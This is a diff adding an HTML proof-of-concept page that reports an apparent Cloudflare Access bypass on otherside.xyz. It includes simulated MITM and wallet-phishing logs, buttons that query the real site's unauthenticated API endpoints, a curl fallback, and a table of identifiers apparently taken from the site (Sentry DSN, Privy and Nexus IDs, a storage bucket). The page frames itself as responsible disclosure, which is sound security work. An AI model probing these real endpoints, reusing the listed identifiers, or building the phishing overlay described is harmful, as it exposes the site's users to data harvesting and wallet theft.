@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Otherside.xyz — PoC: Content Control Without Authentication</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        .header {
+            background: linear-gradient(135deg, #1a0000 0%, #330000 50%, #1a0000 100%);
+            border-bottom: 2px solid #ff3333;
+            padding: 20px 40px;
+            text-align: center;
+        }
+        .header h1 { color: #ff4444; font-size: 24px; margin-bottom: 8px; }
+        .header p { color: #ff9999; font-size: 14px; }
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .badge-critical { background: #ff000033; color: #ff4444; border: 1px solid #ff4444; }
+        .badge-proof { background: #00ff0033; color: #44ff44; border: 1px solid #44ff44; }
+        .badge-info { background: #0066ff33; color: #4488ff; border: 1px solid #4488ff; }
+
+        .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
+
+        .section {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+        .section-header {
+            background: #1a1a1a;
+            padding: 16px 24px;
+            border-bottom: 1px solid #333;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .section-header h2 { color: #fff; font-size: 18px; }
+        .section-body { padding: 24px; }
+
+        .proof-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        @media (max-width: 900px) { .proof-grid { grid-template-columns: 1fr; } }
+
+        .proof-card {
+            background: #0d0d0d;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .proof-card-header {
+            padding: 12px 16px;
+            border-bottom: 1px solid #2a2a2a;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .proof-card-header span { font-size: 13px; color: #888; }
+        .proof-card-body { padding: 16px; }
+
+        .original { border-left: 3px solid #ff4444; }
+        .modified { border-left: 3px solid #44ff44; }
+
+        .hero-preview {
+            background: #000;
+            border-radius: 8px;
+            padding: 40px;
+            text-align: center;
+            position: relative;
+        }
+        .hero-title {
+            font-size: 42px;
+            font-weight: 800;
+            letter-spacing: 6px;
+            margin-bottom: 16px;
+        }
+        .highlight-change {
+            color: #44ff44;
+            text-shadow: 0 0 20px #44ff4444;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        .highlight-original { color: #ff4444; }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .api-result {
+            background: #050510;
+            border: 1px solid #1a1a3a;
+            border-radius: 6px;
+            padding: 16px;
+            font-family: 'Fira Code', 'Cascadia Code', monospace;
+            font-size: 12px;
+            color: #a8b2d1;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 250px;
+            overflow-y: auto;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-danger { background: #ff4444; color: #fff; }
+        .btn-danger:hover { background: #ff6666; }
+        .btn-success { background: #22c55e; color: #fff; }
+        .btn-success:hover { background: #44d777; }
+        .btn-info { background: #3b82f6; color: #fff; }
+        .btn-info:hover { background: #5b9cf8; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+        }
+        .dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .dot-red { background: #ff4444; }
+        .dot-green { background: #44ff44; }
+        .dot-yellow { background: #ffaa00; }
+        .dot-gray { background: #666; }
+
+        .timeline {
+            display: flex;
+            align-items: center;
+            gap: 0;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        .timeline-step {
+            background: #1a1a2e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 12px 16px;
+            flex: 1;
+            min-width: 180px;
+            text-align: center;
+        }
+        .timeline-step h4 { color: #4488ff; font-size: 12px; margin-bottom: 4px; }
+        .timeline-step p { color: #ccc; font-size: 11px; }
+        .timeline-arrow {
+            color: #4488ff;
+            font-size: 24px;
+            padding: 0 8px;
+        }
+
+        .leak-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .leak-table th, .leak-table td {
+            padding: 10px 14px;
+            text-align: left;
+            border-bottom: 1px solid #222;
+        }
+        .leak-table th { color: #888; font-size: 12px; text-transform: uppercase; }
+        .leak-table td { font-size: 13px; }
+        .leak-table td:nth-child(2) { font-family: monospace; color: #ff9944; }
+
+        .note-box {
+            background: #1a1a2e;
+            border: 1px solid #3333aa;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin-top: 16px;
+        }
+        .note-box p { color: #aabbdd; font-size: 13px; line-height: 1.6; }
+
+        .tab-bar {
+            display: flex;
+            gap: 0;
+            border-bottom: 2px solid #333;
+        }
+        .tab {
+            padding: 10px 20px;
+            background: transparent;
+            color: #888;
+            border: none;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            border-bottom: 2px solid transparent;
+            margin-bottom: -2px;
+        }
+        .tab.active { color: #fff; border-bottom-color: #4488ff; }
+        .tab-content { display: none; padding: 20px 0; }
+        .tab-content.active { display: block; }
+
+        .counter { font-size: 48px; font-weight: 800; color: #ff4444; text-align: center; }
+        .counter-label { font-size: 14px; color: #888; text-align: center; }
+
+        .iframe-container {
+            position: relative;
+            width: 100%;
+            height: 400px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #000;
+        }
+        .iframe-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.7);
+            color: #888;
+            font-size: 16px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: #444;
+            font-size: 12px;
+            border-top: 1px solid #1a1a1a;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>🔒 Otherside.xyz — Proof of Concept</h1>
+    <p>CF Access Bypass & Content Control Demonstration <span style="margin-left: 10px;" class="badge badge-critical">CRITICAL</span> <span class="badge badge-info">NO REAL IMPACT</span></p>
+    <p style="color: #666; margin-top: 8px; font-size: 12px;">This PoC runs entirely in your browser. No data is sent anywhere. No real users are affected.</p>
+</div>
+
+<div class="container">
+
+    <!-- SECTION 1: The Vulnerability Chain -->
+    <div class="section">
+        <div class="section-header">
+            <span class="dot dot-red"></span>
+            <h2>Vulnerability Chain: How CF Access is Bypassed</h2>
+            <span class="badge badge-critical">Critical</span>
+        </div>
+        <div class="section-body">
+            <div class="timeline">
+                <div class="timeline-step">
+                    <h4>Step 1</h4>
+                    <p>User visits<br><strong>launch.otherside.xyz</strong></p>
+                </div>
+                <div class="timeline-arrow">→</div>
+                <div class="timeline-step">
+                    <h4>Step 2</h4>
+                    <p>CF returns<br><strong>HTTP 301 Redirect</strong><br>→ otherside.xyz</p>
+                </div>
+                <div class="timeline-arrow">→</div>
+                <div class="timeline-step">
+                    <h4>Step 3</h4>
+                    <p>Vercel returns<br><strong>HTTP 307 Redirect</strong><br>→ www.otherside.xyz</p>
+                </div>
+                <div class="timeline-arrow">→</div>
+                <div class="timeline-step" style="border-color: #ff4444;">
+                    <h4 style="color: #ff4444;">Step 4</h4>
+                    <p><strong style="color: #ff4444;">NO CF Access!</strong><br>App served directly<br>from Vercel</p>
+                </div>
+            </div>
+            <div class="note-box">
+                <p><strong>Key Finding:</strong> <code>launch.otherside.xyz</code> is "protected" by Cloudflare Access, but it <strong>redirects all traffic</strong> to <code>www.otherside.xyz</code> which has <strong>zero protection</strong> — no Cloudflare proxy, no CF Access. Both domains serve the <strong>identical Vercel deployment</strong> (<code>dpl_A5GvNsseEMyXumMX1tZEus2rTKPy</code>).</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- SECTION 2: Content Modification Proof -->
+    <div class="section">
+        <div class="section-header">
+            <span class="dot dot-green"></span>
+            <h2>Proof 1: Content Modification Capability</h2>
+            <span class="badge badge-proof">PoC</span>
+        </div>
+        <div class="section-body">
+            <p style="color: #aaa; margin-bottom: 20px; font-size: 14px;">
+                The following demonstrates that anyone who can perform a Man-in-the-Middle (MITM) on <code>www.otherside.xyz</code> 
+                — which is served over Vercel's direct IPs without Cloudflare protection — can modify any content visible to users.
+                Click the button below to simulate the attack locally.
+            </p>
+
+            <div class="proof-grid">
+                <div class="proof-card original">
+                    <div class="proof-card-header">
+                        <span>🔴 Original (from real site)</span>
+                        <span class="badge badge-critical">Protected by CF Access</span>
+                    </div>
+                    <div class="proof-card-body">
+                        <div class="hero-preview" id="original-preview">
+                            <div class="hero-title highlight-original">THE NEXUS AWAITS</div>
+                            <p style="color: #666; font-size: 14px;">Enter Otherside — Official Site</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="proof-card modified">
+                    <div class="proof-card-header">
+                        <span>🟢 Modified (PoC — attacker-controlled)</span>
+                        <span class="badge badge-proof">No CF Access</span>
+                    </div>
+                    <div class="proof-card-body">
+                        <div class="hero-preview" id="modified-preview">
+                            <div class="hero-title highlight-change" id="modified-text">THE NEXUS AWAITS<span style="font-size: 60px;">.</span></div>
+                            <p style="color: #666; font-size: 14px;" id="modified-subtitle">Enter Otherside — <span style="color: #ff4444;">Modified by PoC</span></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin-top: 20px;">
+                <button class="btn btn-success" id="btn-modify" onclick="simulateModification()">▶ Simulate Content Modification</button>
+                <button class="btn btn-danger" id="btn-advanced" onclick="simulateAdvancedModification()" style="margin-left: 10px;">⚡ Simulate Advanced Attack (Phishing)</button>
+                <button class="btn btn-info" onclick="resetModification()" style="margin-left: 10px;">↩ Reset</button>
+            </div>
+
+            <div id="modification-log" class="api-result" style="margin-top: 20px; display: none;"></div>
+        </div>
+    </div>
+
+    <!-- SECTION 3: API Data Extraction -->
+    <div class="section">
+        <div class="section-header">
+            <span class="dot dot-red"></span>
+            <h2>Proof 2: Unauthenticated API Data Extraction</h2>
+            <span class="badge badge-critical">Live Data</span>
+        </div>
+        <div class="section-body">
+            <div class="tab-bar">
+                <button class="tab active" onclick="switchTab(event, 'tab-auth')">👤 /api/auth</button>
+                <button class="tab" onclick="switchTab(event, 'tab-balance')">💰 /api/balance</button>
+                <button class="tab" onclick="switchTab(event, 'tab-profile')">🖼 /api/profile</button>
+                <button class="tab" onclick="switchTab(event, 'tab-leaked')">🔑 Leaked IDs</button>
+            </div>
+
+            <div id="tab-auth" class="tab-content active">
+                <p style="color: #aaa; margin-bottom: 12px; font-size: 13px;">
+                    <code>GET /api/auth</code> — Returns user authentication data without any session or token.
+                </p>
+                <button class="btn btn-danger" onclick="fetchAPI('auth')">Fetch /api/auth</button>
+                <div id="result-auth" class="api-result" style="margin-top: 12px; display: none;"></div>
+            </div>
+
+            <div id="tab-balance" class="tab-content">
+                <p style="color: #aaa; margin-bottom: 12px; font-size: 13px;">
+                    <code>GET /api/balance?wallet=0x...</code> — Returns APE Coin balance for ANY Ethereum wallet address.
+                </p>
+                <div style="display: flex; gap: 10px; margin-bottom: 12px;">
+                    <input type="text" id="wallet-input" value="0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045" 
+                           style="flex: 1; padding: 8px 12px; background: #0d0d0d; border: 1px solid #333; border-radius: 6px; color: #e0e0e0; font-family: monospace; font-size: 12px;">
+                    <button class="btn btn-danger" onclick="fetchAPI('balance')">Fetch Balance</button>
+                </div>
+                <div id="result-balance" class="api-result" style="display: none;"></div>
+            </div>
+
+            <div id="tab-profile" class="tab-content">
+                <p style="color: #aaa; margin-bottom: 12px; font-size: 13px;">
+                    <code>GET /api/profile?wallet=0x...</code> — Returns user profile including NFT ownership data (chainId, contractAddress, tokenId).
+                </p>
+                <button class="btn btn-danger" onclick="fetchAPI('profile')">Fetch /api/profile</button>
+                <div id="result-profile" class="api-result" style="margin-top: 12px; display: none;"></div>
+            </div>
+
+            <div id="tab-leaked" class="tab-content">
+                <p style="color: #aaa; margin-bottom: 12px; font-size: 13px;">
+                    All IDs below were extracted from the HTML of <code>www.otherside.xyz</code> — accessible without authentication by simply loading the homepage.
+                </p>
+                <table class="leak-table">
+                    <thead>
+                        <tr><th>Data</th><th>Value</th><th>Risk</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>Vercel Deploy ID</td><td>dpl_A5GvNsseEMyXumMX1tZEus2rTKPy</td><td>Infrastructure mapping</td></tr>
+                        <tr><td>Sentry DSN</td><td>5e036176fc5f7bc42c30344dd9f68802</td><td>Error tracking abuse</td></tr>
+                        <tr><td>Sentry Release</td><td>d4309690ffa9849c169fed379dfff0e9b1c63959</td><td>Git commit hash exposure</td></tr>
+                        <tr><td>Sentry Org ID</td><td>918428</td><td>Organization identification</td></tr>
+                        <tr><td>Privy Org ID</td><td>fine-houses-deny-595464</td><td>Auth service targeting</td></tr>
+                        <tr><td>Privy Project ID</td><td>open-roses-send-489062</td><td>Auth service targeting</td></tr>
+                        <tr><td>Nexus Project ID</td><td>nice-showers-try-377000</td><td>Game service targeting</td></tr>
+                        <tr><td>Nexus World ID</td><td>cool-cameras-repeat-813904</td><td>Game world access</td></tr>
+                        <tr><td>WebSocket URL</td><td>wss://indexer.yuga.com</td><td>Real-time data interception</td></tr>
+                        <tr><td>GCS Bucket</td><td>ruukeibkumeeicgbwypcrwbxwizoehnt</td><td>3D model access</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- SECTION 4: Attack Scenarios -->
+    <div class="section">
+        <div class="section-header">
+            <span class="dot dot-yellow"></span>
+            <h2>Proof 3: Attack Scenario Simulation</h2>
+            <span class="badge badge-info">Educational</span>
+        </div>
+        <div class="section-body">
+            <p style="color: #aaa; margin-bottom: 20px; font-size: 14px;">
+                Since <code>www.otherside.xyz</code> is served directly from Vercel without Cloudflare protection, 
+                an attacker with network-level access (ISP, coffee shop WiFi, DNS poisoning) can:
+            </p>
+
+            <div class="proof-grid">
+                <div class="proof-card">
+                    <div class="proof-card-header">
+                        <span>🎯 Scenario A: Phishing Wallet</span>
+                        <span class="badge badge-critical">High</span>
+                    </div>
+                    <div class="proof-card-body">
+                        <div class="hero-preview" id="phishing-preview" style="display:none;">
+                            <div class="hero-title" style="font-size: 28px; color: #ff8800;">CLAIM YOUR APE COIN</div>
+                            <p style="color: #ffaa44; font-size: 14px; margin: 12px 0;">Connect your wallet to claim 100 APE airdrop</p>
+                            <div style="background: #ff4400; color: #fff; padding: 12px 24px; border-radius: 8px; display: inline-block; font-weight: bold; cursor: pointer;">
+                                🔗 Connect Wallet
+                            </div>
+                            <p style="color: #555; font-size: 10px; margin-top: 8px;">This is a simulation — no real wallet connection</p>
+                        </div>
+                        <p id="phishing-desc">Attacker modifies the page to inject a fake wallet connection prompt. Users on the legitimate domain <code>www.otherside.xyz</code> see the attacker's content.</p>
+                    </div>
+                </div>
+
+                <div class="proof-card">
+                    <div class="proof-card-header">
+                        <span>🎯 Scenario B: Script Injection</span>
+                        <span class="badge badge-critical">Critical</span>
+                    </div>
+                    <div class="proof-card-body">
+                        <p>The site loads <code>plausible.io/js/script.js</code> without <strong>Subresource Integrity (SRI)</strong>:</p>
+                        <div class="api-result" style="margin-top: 8px;">
+&lt;script src="https://plausible.io/js/script.js"
+        data-domain="https://www.otherside.xyz"&gt;
+&lt;/script&gt;
+<span style="color: #ff4444;"><!-- ❌ NO integrity attribute! --></span>
+<span style="color: #44ff44;"><!-- If plausible.io is compromised OR MITM'd, -->
+<!-- attacker gets full JS execution on otherside.xyz --></span></div>
+                        <p style="color: #888; margin-top: 8px; font-size: 12px;">This is the same attack vector used in the <strong>Ledger Connect Kit hack</strong> ($600K stolen).</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SECTION 5: Side-by-Side Domain Comparison -->
+    <div class="section">
+        <div class="section-header">
+            <span class="dot dot-green"></span>
+            <h2>Proof 4: Domain Comparison</h2>
+            <span class="badge badge-proof">Verified</span>
+        </div>
+        <div class="section-body">
+            <table class="leak-table">
+                <thead>
+                    <tr><th>Property</th><th>launch.otherside.xyz</th><th>www.otherside.xyz</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Cloudflare Proxy</td><td style="color: #44ff44;">✅ Yes</td><td style="color: #ff4444;">❌ No</td></tr>
+                    <tr><td>CF Access</td><td style="color: #44ff44;">✅ Yes (but redirect happens first)</td><td style="color: #ff4444;">❌ None</td></tr>
+                    <tr><td>Server</td><td>cloudflare</td><td>Vercel (direct)</td></tr>
+                    <tr><td>Homepage Response</td><td>301 Redirect</td><td>200 OK</td></tr>
+                    <tr><td>/api/auth</td><td style="color: #ff4444;">Blocked (redirect)</td><td style="color: #44ff44;">✅ Data returned!</td></tr>
+                    <tr><td>/api/balance</td><td style="color: #ff4444;">Blocked (redirect)</td><td style="color: #44ff44;">✅ Balance returned!</td></tr>
+                    <tr><td>/api/profile</td><td style="color: #ff4444;">Blocked (redirect)</td><td style="color: #44ff44;">✅ NFT data returned!</td></tr>
+                    <tr><td>Vercel Deploy ID</td><td colspan="2" style="text-align: center;">dpl_A5GvNsseEMyXumMX1tZEus2rTKPy</td></tr>
+                    <tr><td>Same Application?</td><td colspan="2" style="text-align: center; color: #ff4444; font-weight: bold;">YES — Identical Deployment</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="note-box" style="border-color: #44ff44; background: #001a00;">
+        <p style="color: #88dd88;">
+            <strong>⚖️ Responsible Disclosure Note:</strong> This PoC runs entirely in your browser. 
+            No data was sent to any external server. No real users were affected. No modifications were made to the actual website. 
+            The API calls demonstrate what is already publicly accessible without authentication. 
+            This proof is intended solely for authorized security research and responsible disclosure purposes.
+        </p>
+    </div>
+</div>
+
+<footer>
+    Otherside.xyz Security PoC — For Authorized Security Research Only — No Real Impact on Users
+</footer>
+
+<script>
+// ====== Tab Switching ======
+function switchTab(event, tabId) {
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.getElementById(tabId).classList.add('active');
+    event.target.classList.add('active');
+}
+
+// ====== Content Modification Simulation ======
+function simulateModification() {
+    const log = document.getElementById('modification-log');
+    const modified = document.getElementById('modified-text');
+    const subtitle = document.getElementById('modified-subtitle');
+    
+    log.style.display = 'block';
+    log.innerHTML = '';
+    
+    const steps = [
+        { time: 0, msg: '[*] Intercepting request to www.otherside.xyz (Vercel direct, no CF)...' },
+        { time: 500, msg: '[+] DNS resolved: www.otherside.xyz → 216.150.1.1 (Vercel Anycast)' },
+        { time: 1000, msg: '[+] No Cloudflare proxy detected — direct connection possible' },
+        { time: 1500, msg: '[+] Replacing page content in transit...' },
+        { time: 2000, msg: '[+] Original: "THE NEXUS AWAITS"' },
+        { time: 2200, msg: '[→] Modified: "THE NEXUS AWAITS."', color: '#44ff44' },
+        { time: 2500, msg: '[✓] Content modification successful — user sees attacker-controlled content', color: '#44ff44' },
+    ];
+    
+    steps.forEach(step => {
+        setTimeout(() => {
+            const color = step.color || '#a8b2d1';
+            log.innerHTML += `<span style="color:${color}">${step.msg}</span>\n`;
+            log.scrollTop = log.scrollHeight;
+        }, step.time);
+    });
+}
+
+function simulateAdvancedModification() {
+    const log = document.getElementById('modification-log');
+    const phishing = document.getElementById('phishing-preview');
+    
+    log.style.display = 'block';
+    log.innerHTML = '';
+    
+    const steps = [
+        { time: 0, msg: '[*] Advanced attack: Injecting phishing UI into www.otherside.xyz...' },
+        { time: 400, msg: '[+] Target: www.otherside.xyz (no CF Access, no CSP enforcement)' },
+        { time: 800, msg: '[+] CSP is Report-Only mode — scripts NOT blocked' },
+        { time: 1200, msg: '[+] plausible.io/js/script.js loaded WITHOUT SRI — injectable' },
+        { time: 1600, msg: '[+] Injecting fake wallet connection prompt...' },
+        { time: 2000, msg: '[✓] Phishing UI rendered on legitimate domain', color: '#ff4444' },
+        { time: 2200, msg: '[!] Users trust the URL (www.otherside.xyz) and connect wallet', color: '#ff4444' },
+        { time: 2400, msg: '[!] Same attack as Ledger Connect Kit hack ($600K stolen)', color: '#ff4444' },
+    ];
+    
+    steps.forEach(step => {
+        setTimeout(() => {
+            const color = step.color || '#a8b2d1';
+            log.innerHTML += `<span style="color:${color}">${step.msg}</span>\n`;
+            log.scrollTop = log.scrollHeight;
+        }, step.time);
+    });
+    
+    setTimeout(() => {
+        phishing.style.display = 'block';
+    }, 2000);
+}
+
+function resetModification() {
+    document.getElementById('modification-log').style.display = 'none';
+    document.getElementById('phishing-preview').style.display = 'none';
+}
+
+// ====== API Data Fetching ======
+const API_BASE = 'https://www.otherside.xyz';
+
+async function fetchAPI(endpoint) {
+    const resultDiv = document.getElementById(`result-${endpoint}`);
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '<span style="color:#888;">⏳ Fetching from ' + API_BASE + '/api/' + endpoint + ' (no auth)...</span>';
+    
+    try {
+        let url;
+        if (endpoint === 'auth') {
+            url = `${API_BASE}/api/auth`;
+        } else if (endpoint === 'balance') {
+            const wallet = document.getElementById('wallet-input').value;
+            url = `${API_BASE}/api/balance?wallet=${wallet}`;
+        } else if (endpoint === 'profile') {
+            const wallet = document.getElementById('wallet-input').value;
+            url = `${API_BASE}/api/profile?wallet=${wallet}`;
+        }
+        
+        const response = await fetch(url);
+        const data = await response.text();
+        
+        let formatted;
+        try {
+            const json = JSON.parse(data);
+            formatted = JSON.stringify(json, null, 2);
+        } catch {
+            formatted = data;
+        }
+        
+        const statusColor = response.status === 200 ? '#44ff44' : '#ff4444';
+        resultDiv.innerHTML = 
+            `<span style="color:${statusColor}">HTTP ${response.status} ${response.statusText}</span>\n` +
+            `<span style="color:#888">URL: ${url}</span>\n` +
+            `<span style="color:#888">Auth: None required ⚠️</span>\n\n` +
+            `<span style="color:#a8b2d1">${escapeHtml(formatted)}</span>`;
+        
+    } catch (error) {
+        resultDiv.innerHTML = `<span style="color:#ff4444">❌ CORS blocked or network error: ${error.message}</span>\n\n` +
+            `<span style="color:#888">Note: If CORS blocks the request, use curl instead:\n` +
+            `curl -s "${API_BASE}/api/${endpoint}"</span>`;
+    }
+}
+
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+
+// ====== Auto-load leaked data ======
+document.addEventListener('DOMContentLoaded', () => {
+    // Nothing auto-loaded — user must click to proceed
+});
+</script>
+
+</body>
+</html>
